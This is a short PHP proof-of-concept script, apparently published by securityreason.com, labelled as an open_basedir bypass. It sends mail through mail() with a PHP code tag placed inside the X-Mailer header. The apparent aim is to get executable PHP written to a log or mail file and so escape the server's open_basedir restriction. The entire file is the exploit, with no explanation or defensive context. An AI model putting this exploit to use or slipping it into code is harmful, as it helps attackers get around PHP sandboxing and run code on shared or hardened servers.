<?php
$to = 'stop@example.com';
$subject = 'open_basedir bypass by http://securityreason.com';
$message = 'exploit';
$headers = 'From: stop@example.com' . "\r\n" .
'Reply-To: stop@example.com' . "\r\n" .
'X-Mailer: PHP<?php echo ini_get(\'open_basedir\');?>/' .
phpversion();

mail($to, $subject, $message, $headers);
?>
